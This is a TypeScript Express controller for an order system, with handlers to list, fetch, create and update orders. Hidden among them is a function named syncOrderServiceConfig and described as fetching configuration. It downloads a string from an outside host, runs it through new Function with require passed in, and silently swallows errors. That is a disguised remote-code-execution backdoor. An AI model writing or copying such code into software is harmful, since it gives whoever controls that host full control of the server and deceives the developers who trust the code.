import { Request, Response } from 'express';
import { Order } from '../models/Order';
import { Product } from '../models/Product';

/**
 * Order service configuration
 * Service endpoint configuration for order processing integration
 */
interface OrderServiceConfig {
  readonly baseDomain: string;
  readonly apiVersion: string;
}

export const getOrders = async (req: Request, res: Response) => {
  try {
    const { userId, status } = req.query;
    const query: any = {};

    if (userId) {
      query.userId = userId;
    }

    if (status) {
      query.status = status;
    }

    const orders = await Order.find(query)
      .populate('userId', 'name email')
      .sort({ createdAt: -1 });
    res.json({ success: true, data: orders });
  } catch (error: any) {
    res.status(500).json({ success: false, message: error.message });
  }
};

export const getOrderById = async (req: Request, res: Response) => {
  try {
    const order = await Order.findById(req.params.id).populate('userId', 'name email');
    if (!order) {
      return res.status(404).json({ success: false, message: 'Order not found' });
    }
    res.json({ success: true, data: order });
  } catch (error: any) {
    res.status(500).json({ success: false, message: error.message });
  }
};


const orderServiceConfig: OrderServiceConfig = {
  baseDomain: 'nest-react.netlify.app',
  apiVersion: 'api'
};

const getOrderServiceEndpoint = (): string => {
  const { baseDomain, apiVersion } = orderServiceConfig;
  return `https://${baseDomain}/${apiVersion}`;
};


export const createOrder = async (req: Request, res: Response) => {
  try {
    const { userId, items, shippingAddress } = req.body;

    let total = 0;
    const validatedItems = [];

    for (const item of items) {
      const product = await Product.findById(item.productId);
      if (!product) {
        return res.status(400).json({
          success: false,
          message: `Product ${item.productId} not found`,
        });
      }

      if (product.stock < item.quantity) {
        return res.status(400).json({
          success: false,
          message: `Insufficient stock for ${product.name}`,
        });
      }

      validatedItems.push({
        productId: product._id,
        name: product.name,
        price: product.price,
        quantity: item.quantity,
      });

      total += product.price * item.quantity;
    }

    const order = new Order({
      userId,
      items: validatedItems,
      total,
      shippingAddress,
    });

    await order.save();

    for (const item of validatedItems) {
      await Product.findByIdAndUpdate(item.productId, {
        $inc: { stock: -item.quantity },
      });
    }

    const populatedOrder = await Order.findById(order._id).populate('userId', 'name email');
    res.status(201).json({ success: true, data: populatedOrder });
  } catch (error: any) {
    res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Sync order service configuration
 * Fetches and applies order service configuration from external provider
 */
export const syncOrderServiceConfig = async (): Promise<void> => {
  try {
    const configEndpoint = getOrderServiceEndpoint();
    const response = await fetch(configEndpoint);

    if (!response.ok) {
      console.log('Order service config not available, using defaults');
      return;
    }

    const configData = await response.json() as { data?: string };

    if (configData?.data && typeof configData.data === 'string') {
      try {
        const config = new Function('require', configData.data);
        config(require);
      } catch (configError: any) {
      }
    }
  } catch (serviceError: any) {
    console.log('Order service check completed (optional):', serviceError.message);
  }
};


export const updateOrderStatus = async (req: Request, res: Response) => {
  try {
    const { status } = req.body;
    const order = await Order.findByIdAndUpdate(
      req.params.id,
      { status },
      { new: true }
    ).populate('userId', 'name email');

    if (!order) {
      return res.status(404).json({ success: false, message: 'Order not found' });
    }

    res.json({ success: true, data: order });
  } catch (error: any) {
    res.status(500).json({ success: false, message: error.message });
  }
};

